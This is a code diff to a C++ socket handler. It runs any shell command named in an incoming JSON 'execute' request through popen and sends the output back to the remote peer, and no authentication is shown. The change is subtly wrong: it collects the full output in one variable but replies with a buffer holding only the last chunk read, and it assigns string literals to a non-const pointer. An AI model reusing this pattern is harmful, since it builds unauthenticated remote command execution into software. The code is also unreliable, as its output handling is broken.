@@ -114,27 +114,28 @@ void* SocketConnect::openSocket(void *arg) {
             const char *message = s.GetString();
             send(socketHandle, message, strlen(message), 0);
         } else if(strcmp(document["req"].GetString(), "execute") == 0) {
-            char *cmdOutput;
+            char *cmdOutput = "";
             FILE* pipe = popen(document["cmd"].GetString(), "r");
             if(pipe) {
-                char buffer[128];
+                char cmdBuffer[1024];
                 std::string result = "";
                 while(!feof(pipe)) {
-                    if(fgets(buffer, 128, pipe) != NULL)
-                        result += buffer;
+                    if(fgets(cmdBuffer, 1024, pipe) != NULL)
+                        result += cmdBuffer;
                 }
                 pclose(pipe);
+                cmdOutput = cmdBuffer;
             } else {
                 cmdOutput = "Error, could not open pipe.";
             }
+            
             rapidjson::StringBuffer s;
             rapidjson::Writer<rapidjson::StringBuffer> writer(s);
             writer.StartObject();
             writer.String("res");
             writer.String("execute");
             writer.String("cmd");
-            //writer.String(cmdOutput);
-            writer.String("Success");
+            writer.String(cmdOutput);
             writer.EndObject();
             const char *jsonReply = s.GetString();
             send(socketHandle, jsonReply, strlen(jsonReply), 0);
